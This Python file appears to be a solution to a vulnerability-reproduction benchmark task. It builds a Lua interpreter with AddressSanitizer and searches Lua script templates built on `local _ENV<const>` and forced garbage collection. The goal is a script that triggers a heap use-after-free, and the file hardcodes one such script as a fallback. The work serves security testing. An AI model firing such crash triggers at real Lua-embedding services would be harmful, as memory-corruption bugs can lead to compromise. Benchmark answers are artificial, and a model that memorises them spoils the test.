import os
import re
import sys
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path
from typing import Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = b"do local _ENV<const>=setmetatable({},{__index=_G});collectgarbage('collect');x=1 end\n"
        try:
            with tempfile.TemporaryDirectory(prefix="poc_lua_uaf_") as td:
                root = self._prepare_source(src_path, td)
                if root is None:
                    return fallback

                lua_bin = self._build_lua_asan(root, td)
                if lua_bin is None:
                    return fallback

                script = self._find_poc(lua_bin, root, td)
                if script is None:
                    return fallback
                if not script.endswith("\n"):
                    script += "\n"
                return script.encode("utf-8", errors="ignore")
        except Exception:
            return fallback

    def _prepare_source(self, src_path: str, td: str) -> Optional[Path]:
        p = Path(src_path)
        if p.is_dir():
            root = self._find_lua_root(p)
            return root

        if not p.is_file():
            return None

        extract_dir = Path(td) / "src"
        extract_dir.mkdir(parents=True, exist_ok=True)

        try:
            with tarfile.open(p, "r:*") as tf:
                def is_within_directory(directory: Path, target: Path) -> bool:
                    try:
                        directory = directory.resolve()
                        target = target.resolve()
                        return str(target).startswith(str(directory) + os.sep) or target == directory
                    except Exception:
                        return False

                members = tf.getmembers()
                for m in members:
                    name = m.name
                    if not name or name.startswith("/") or ".." in Path(name).parts:
                        continue
                    target = extract_dir / name
                    if not is_within_directory(extract_dir, target):
                        continue
                    tf.extract(m, path=extract_dir)
        except Exception:
            return None

        root = self._find_lua_root(extract_dir)
        return root

    def _find_lua_root(self, base: Path) -> Optional[Path]:
        base = base.resolve()
        # Prefer closest directory that contains src/lua.c and src/lauxlib.c
        candidates = []
        for dirpath, dirnames, filenames in os.walk(base):
            dp = Path(dirpath)
            if (dp / "src" / "lua.c").is_file() and (dp / "src" / "lauxlib.c").is_file():
                candidates.append(dp)
        if candidates:
            candidates.sort(key=lambda x: len(str(x)))
            return candidates[0]
        # Fallback: directory containing lua.c directly
        for dirpath, dirnames, filenames in os.walk(base):
            dp = Path(dirpath)
            if (dp / "lua.c").is_file() and (dp / "lauxlib.c").is_file():
                return dp
        return None

    def _build_lua_asan(self, root: Path, td: str) -> Optional[Path]:
        # Try make-based build first; if fails, do manual compile.
        env = os.environ.copy()
        cc = shutil.which("clang") or shutil.which("gcc") or shutil.which("cc")
        if not cc:
            return None

        asan_cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address -fno-common"
        asan_ldflags = "-fsanitize=address"
        env["CC"] = cc
        env["MYCFLAGS"] = asan_cflags
        env["MYLDFLAGS"] = asan_ldflags
        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:disable_coredump=1")
        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1")

        makefile = root / "Makefile"
        if makefile.is_file() and shutil.which("make"):
            for target in ("posix", "generic", "linux"):
                if self._run_cmd(["make", "clean"], cwd=root, env=env, timeout=120) is None:
                    pass
                r = self._run_cmd(["make", "-j8", target], cwd=root, env=env, timeout=300)
                if r and r.returncode == 0:
                    lua_bin = self._find_lua_binary(root)
                    if lua_bin:
                        if self._run_cmd([str(lua_bin), "-e", "print(1)"], cwd=root, env=env, timeout=5):
                            return lua_bin

        # Manual compile fallback
        lua_bin = Path(td) / "lua_asan_bin"
        ok = self._manual_build_lua(root, lua_bin, cc, asan_cflags, asan_ldflags, env)
        if ok:
            if self._run_cmd([str(lua_bin), "-e", "print(1)"], cwd=root, env=env, timeout=5):
                return lua_bin
        return None

    def _find_lua_binary(self, root: Path) -> Optional[Path]:
        candidates = []
        for rel in ("src/lua", "lua", "bin/lua", "src/lua.exe", "lua.exe", "bin/lua.exe"):
            p = root / rel
            if p.is_file() and os.access(p, os.X_OK):
                candidates.append(p)
        if candidates:
            candidates.sort(key=lambda x: (0 if "src" in str(x) else 1, len(str(x))))
            return candidates[0]
        # Search
        for dirpath, dirnames, filenames in os.walk(root):
            for fn in ("lua", "lua.exe"):
                p = Path(dirpath) / fn
                if p.is_file() and os.access(p, os.X_OK):
                    candidates.append(p)
        if not candidates:
            return None
        candidates.sort(key=lambda x: (0 if (x.parent.name == "src") else 1, len(str(x))))
        return candidates[0]

    def _manual_build_lua(
        self,
        root: Path,
        out_bin: Path,
        cc: str,
        cflags: str,
        ldflags: str,
        env: dict,
    ) -> bool:
        srcdir = root / "src"
        if not srcdir.is_dir():
            srcdir = root
        if not (srcdir / "lua.c").is_file():
            return False

        core = [
            "lapi.c", "lcode.c", "lctype.c", "ldebug.c", "ldo.c", "ldump.c", "lfunc.c", "lgc.c",
            "llex.c", "lmem.c", "lobject.c", "lopcodes.c", "lparser.c", "lstate.c", "lstring.c",
            "ltable.c", "ltm.c", "lundump.c", "lvm.c", "lzio.c",
        ]
        libs = [
            "lauxlib.c", "lbaselib.c", "lcorolib.c", "ldblib.c", "liolib.c", "lmathlib.c",
            "loslib.c", "lstrlib.c", "ltablib.c", "lutf8lib.c", "loadlib.c", "linit.c",
        ]
        files = []
        for f in ["lua.c"] + core + libs:
            fp = srcdir / f
            if fp.is_file():
                files.append(str(fp))
        if len(files) < 10:
            # fallback: compile all .c except luac.c and test helpers
            allc = [p for p in srcdir.glob("*.c")]
            picked = []
            for p in allc:
                n = p.name
                if n == "luac.c":
                    continue
                if n.startswith("ltests") or n.startswith("ltest"):
                    continue
                picked.append(str(p))
            if not picked:
                return False
            files = picked

        includes = f"-I{srcdir}"
        defs = "-DLUA_USE_POSIX -DLUA_USE_DLOPEN"
        cmd = [cc] + cflags.split() + defs.split() + includes.split() + files + ldflags.split() + ["-lm", "-ldl", "-o", str(out_bin)]
        r = self._run_cmd(cmd, cwd=root, env=env, timeout=300)
        return bool(r and r.returncode == 0 and out_bin.is_file() and os.access(out_bin, os.X_OK))

    def _run_cmd(self, cmd, cwd: Path, env: dict, timeout: int) -> Optional[subprocess.CompletedProcess]:
        try:
            return subprocess.run(
                cmd,
                cwd=str(cwd),
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                check=False,
            )
        except Exception:
            return None

    def _run_lua(self, lua_bin: Path, cwd: Path, script: str, timeout: int = 2) -> Tuple[int, str, str]:
        env = os.environ.copy()
        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:disable_coredump=1")
        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1")
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".lua", encoding="utf-8") as f:
            f.write(script)
            fname = f.name
        try:
            r = subprocess.run(
                [str(lua_bin), fname],
                cwd=str(cwd),
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                check=False,
            )
            out = r.stdout.decode("utf-8", errors="ignore")
            err = r.stderr.decode("utf-8", errors="ignore")
            return r.returncode, out, err
        except subprocess.TimeoutExpired:
            return -999, "", "TIMEOUT"
        finally:
            try:
                os.unlink(fname)
            except Exception:
                pass

    def _is_asan_uaf(self, stderr: str) -> bool:
        s = stderr
        if "AddressSanitizer" not in s and "Sanitizer" not in s:
            return False
        if "use-after-free" in s:
            return True
        if "heap-use-after-free" in s:
            return True
        return False

    def _find_repo_snippets(self, root: Path, max_files: int = 2000) -> List[str]:
        res = []
        count = 0
        for dirpath, dirnames, filenames in os.walk(root):
            dp = Path(dirpath)
            for fn in filenames:
                if count >= max_files:
                    return res
                if not (fn.endswith(".lua") or fn.endswith(".txt") or fn.endswith(".md") or fn.endswith(".c") or fn.endswith(".h")):
                    continue
                fp = dp / fn
                try:
                    st = fp.stat()
                    if st.st_size > 200_000:
                        continue
                    data = fp.read_bytes()
                except Exception:
                    continue
                count += 1
                try:
                    txt = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if "_ENV" in txt and "<const>" in txt and "local" in txt:
                    # Try to extract the smallest region containing it (simple heuristic)
                    idx = txt.find("_ENV")
                    start = max(0, idx - 800)
                    end = min(len(txt), idx + 1200)
                    snippet = txt[start:end]
                    # Ensure it's at least syntactically likely: add wrapper do-end around it
                    snippet2 = "do\n" + snippet + "\nend\n"
                    res.append(snippet2)
        return res

    def _gen_locals(self, n: int) -> str:
        if n <= 0:
            return ""
        names = [f"a{i}" for i in range(n)]
        return "local " + ",".join(names) + ";"

    def _templates(self) -> List[Tuple[str, callable]]:
        def t0(n: int) -> str:
            return "do local _ENV<const>=setmetatable({},{__index=_G});collectgarbage('collect');x=1 end"

        def t1(n: int) -> str:
            return "do local _ENV<const>=setmetatable({},{__index=_G});" + self._gen_locals(n) + "collectgarbage('collect');x=1 end"

        def t2(n: int) -> str:
            # Keep function alive across scope and call later
            return "local f;do local _ENV<const>=setmetatable({},{__index=_G});" + self._gen_locals(n) + "f=function()return x end end;collectgarbage('collect');f()"

        def t3(n: int) -> str:
            # Inner scope closes _ENV before function returns
            return ("local function g()local f;do local _ENV<const>=setmetatable({},{__index=_G});"
                    + self._gen_locals(n) +
                    "f=function()return x end end;collectgarbage('collect');return f() end;g()")

        def t4(n: int) -> str:
            # Load to force separate compilation
            inner = "do local _ENV<const>=setmetatable({},{__index=_G});" + self._gen_locals(n) + "collectgarbage('collect');x=1 end"
            inner = inner.replace("\\", "\\\\").replace("'", "\\'")
            return "local s='" + inner + "';assert(load(s))()"

        def t5(n: int) -> str:
            # Memory pressure + GC
            pressure = "for i=1," + str(max(1, n)) + " do local s=string.rep('a',1024) end;"
            return "do local _ENV<const>=setmetatable({},{__index=_G});" + pressure + "collectgarbage('collect');x=1 end"

        def t6(n: int) -> str:
            # Use <close> variable too
            meta = "setmetatable({},{__close=function()end})"
            return ("do local _ENV<const>=setmetatable({},{__index=_G});"
                    "local c<close>=" + meta + ";"
                    + self._gen_locals(n) +
                    "collectgarbage('collect');x=1 end")

        return [
            ("t0", t0),
            ("t2", t2),
            ("t3", t3),
            ("t1", t1),
            ("t4", t4),
            ("t5", t5),
            ("t6", t6),
        ]

    def _find_poc(self, lua_bin: Path, root: Path, td: str) -> Optional[str]:
        # First try short templates with small n; then scale n.
        ns_small = [0, 1, 2, 3, 4, 5, 8, 13, 21]
        ns_big = [34, 55, 89, 144, 233, 377, 610, 800, 1000]
        templates = self._templates()

        def test_script(script: str) -> bool:
            rc, out, err = self._run_lua(lua_bin, root, script, timeout=2)
            if rc == -999:
                return False
            return self._is_asan_uaf(err)

        # Try repository snippets (might include real reproducer)
        snippets = self._find_repo_snippets(root)
        # Test small snippets first
        snippets.sort(key=lambda s: len(s))
        for snip in snippets[:40]:
            if test_script(snip):
                # Try to minify by stripping wrapper if possible
                s = self._minify_lua(snip)
                if test_script(s):
                    return s
                return snip

        # Systematic template search
        found: Optional[Tuple[str, int, str]] = None
        for name, gen in templates:
            for n in ns_small + ns_big:
                script = gen(n)
                if test_script(script):
                    found = (name, n, script)
                    break
            if found:
                break

        if not found:
            # Deterministic random-ish variations around patterns
            for n in [16, 32, 48, 64, 96, 128, 192, 256, 384, 512, 768, 1024]:
                script = ("local function h()do local _ENV<const>=setmetatable({},{__index=_G});"
                          + self._gen_locals(n) +
                          "collectgarbage('collect');x=1 end end;h()")
                if test_script(script):
                    found = ("hwrap", n, script)
                    break

        if not found:
            return None

        name, n0, script0 = found

        # Attempt to minimize parameter n if template used it
        gen_map = {nm: g for nm, g in templates}
        if name in gen_map:
            gen = gen_map[name]
            lo, hi = 0, n0
            best_n = n0
            while lo <= hi:
                mid = (lo + hi) // 2
                s = gen(mid)
                if test_script(s):
                    best_n = mid
                    hi = mid - 1
                else:
                    lo = mid + 1
            script0 = gen(best_n)

        script0 = self._minify_lua(script0)
        return script0

    def _minify_lua(self, s: str) -> str:
        # Very conservative minification (avoid touching strings)
        # Remove leading/trailing whitespace per line and collapse blank lines.
        lines = s.splitlines()
        lines = [ln.strip() for ln in lines if ln.strip() != ""]
        s2 = ";".join(lines)
        # Collapse multiple semicolons
        s2 = re.sub(r";{2,}", ";", s2)
        # Remove spaces around some tokens (safe-ish)
        s2 = re.sub(r"\s+", " ", s2)
        s2 = s2.replace(" ;", ";").replace("; ", ";")
        s2 = s2.replace(" do ", " do ").replace(" end", " end")
        return s2.strip() + "\n"